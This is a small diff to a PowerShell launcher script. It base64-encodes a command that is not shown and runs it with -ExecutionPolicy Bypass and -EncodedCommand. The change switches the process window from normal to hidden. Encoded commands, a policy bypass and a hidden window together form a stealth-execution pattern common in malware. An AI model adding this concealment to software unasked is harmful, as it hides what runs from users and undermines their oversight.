@@ -28,7 +28,7 @@ $command = @"
 $encoded = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($command))
 $start = @{
     FilePath = 'powershell.exe'
-    WindowStyle = 'Normal'
+    WindowStyle = 'Hidden'
     ArgumentList = @('-NoProfile','-ExecutionPolicy','Bypass','-EncodedCommand',$encoded)
     PassThru = $true
 }
